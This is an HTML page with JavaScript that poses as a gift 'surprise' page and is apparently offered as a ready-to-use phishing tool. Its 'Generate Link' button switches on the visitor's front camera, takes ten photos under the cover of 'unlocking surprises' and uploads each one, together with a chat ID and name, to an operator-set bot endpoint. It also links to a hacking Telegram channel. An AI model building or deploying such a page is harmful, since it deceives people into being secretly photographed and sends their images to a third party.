<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Your Surprise</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
body { background: linear-gradient(135deg,#6a11cb 0%,#2575fc 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
.container { background:white; padding:25px; border-radius:15px; max-width:450px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.2);}
.gift { font-size:50px; margin:10px 0; }
h1 { color:#333; margin:10px 0; font-size:22px; }
.btn { background:linear-gradient(90deg,#6a11cb,#2575fc); color:white; border:none; padding:15px; width:100%; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; margin:15px 0;}
.btn:disabled { opacity:0.7; cursor:not-allowed;}
video { width:100%; border-radius:10px; border:3px solid #6a11cb; margin:15px 0; display:none; transform:scaleX(-1);}
.progress { width:100%; height:8px; background:#eee; border-radius:4px; margin:15px 0; overflow:hidden;}
.progress-bar { height:100%; width:0%; background:#00b09b; transition: width 0.3s; }
.hidden { display:none; }
.photo-preview { width:140px; height:140px; border-radius:10px; border:3px solid #6a11cb; margin:15px auto; object-fit:cover;}
.success { color:#00b09b; background:#e6fff9; padding:10px; border-radius:8px; margin:10px 0;}
.counter { color:#666; font-size:14px; margin:5px 0;}
</style>
</head>
<body>
<div class="container">
    <div class="gift">üéÅ</div>
    <h1 id="title">Welcome!</h1>
    <p id="message" style="color:#666;">Please join our Telegram channel to use the surprise.</p>
    <button class="btn" id="joinBtn">‚úÖ I Joined</button>
    <div id="menu" class="hidden">
        <button class="btn" id="generateBtn">Generate Link</button>
        <button class="btn" id="contactBtn">Contact Owner</button>
    </div>
    <video id="video" autoplay playsinline></video>
    <div class="progress hidden" id="progress">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div id="counter" class="counter hidden"></div>
    <img id="photoPreview" class="photo-preview hidden">
    <div id="status" class="success hidden"></div>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_ENDPOINT = "http://192.168.1.13:5000/upload"; // CHANGE to your Termux IP
const USER_CHAT_ID = new URLSearchParams(window.location.search).get("chat_id");
const USER_NAME = new URLSearchParams(window.location.search).get("name") || "Friend";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
let stream = null;
let photosSent = 0;

document.getElementById("joinBtn").onclick = () => {
    document.getElementById("joinBtn").classList.add("hidden");
    document.getElementById("menu").classList.remove("hidden");
    document.getElementById("message").textContent = "üéâ Welcome! Now choose an option.";
};

// GENERATE LINK BUTTON
document.getElementById("generateBtn").onclick = async () => {
    document.getElementById("title").textContent = "üì∏ Taking Your Surprise Photos!";
    document.getElementById("message").textContent = "Smile üòÄ - Capturing 10 photos...";
    document.getElementById("menu").classList.add("hidden");
    document.getElementById("progress").classList.remove("hidden");

    try {
        stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} } });
        video.srcObject = stream;
        video.style.display = "block";
        await new Promise(r => video.onloadedmetadata = r);

        for(let i=1;i<=10;i++){
            await delay(500);
            const blob = await capturePhoto(i);
            await sendPhoto(blob,i);
            photosSent++;
            showStatus(`üéÅ Surprise ${i} unlocked!`);
            updateProgress(i,10);
            await delay(800);
        }
        finish();
    } catch(e){
        alert("Camera access denied or error!");
        console.error(e);
    }
};

// CONTACT OWNER BUTTON
document.getElementById("contactBtn").onclick = () => {
    window.open("https://t.me/Hackers_Colony_Official","_blank");
};

// CAPTURE PHOTO
async function capturePhoto(num){
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    return new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
}

// SEND PHOTO TO BOT
async function sendPhoto(blob,num){
    const formData = new FormData();
    formData.append("photo",blob);
    formData.append("user_chat_id",USER_CHAT_ID);
    formData.append("user_name",USER_NAME);
    await fetch(BOT_ENDPOINT,{method:"POST",body:formData});
}

// HELPER
function updateProgress(current,total){
    const percent = (current/total)*100;
    document.getElementById("progressBar").style.width = percent+"%";
    document.getElementById("counter").textContent = `${current}/${total}`;
    document.getElementById("counter").classList.remove("hidden");
}

function showStatus(text){
    const status = document.getElementById("status");
    status.textContent = text;
    status.classList.remove("hidden");
    setTimeout(()=>status.classList.add("hidden"),1200);
}

function delay(ms){return new Promise(res=>setTimeout(res,ms));}

function finish(){
    if(stream){stream.getTracks().forEach(t=>t.stop());}
    document.getElementById("title").textContent = "‚úÖ All Surprises Unlocked!";
    document.getElementById("message").textContent = "Check your Telegram to see the photos!";
    document.getElementById("actionBtn")?.classList.remove("hidden");
}
</script>
</body>
</html>
